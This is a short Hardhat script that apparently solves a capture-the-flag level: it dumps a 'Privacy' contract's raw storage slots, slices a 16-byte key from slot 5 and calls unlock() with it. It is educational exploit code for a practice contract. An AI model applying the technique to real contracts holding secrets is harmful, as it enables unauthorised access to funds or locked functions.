const hre = require("hardhat");
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const priv = await ethers.getContractAt("Privacy", process.env.PRIVACY_ADDR)

  for (let i = 0; i < 8; i++){
    console.log(await ethers.provider.getStorageAt(priv.address, i))
  }

  const data_2 = ethers.provider.getStorageAt(priv.address, 5);

  // 2 chars for the 0x, then each byte is 2 chars
  const key = (await data_2).substring(0, 2 + 2*16);

  console.log("key: ", key, key.length)

  const tx = await priv.unlock(key);
  await tx.wait()

  console.log(`Is locked: ${await priv.locked()}`)

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
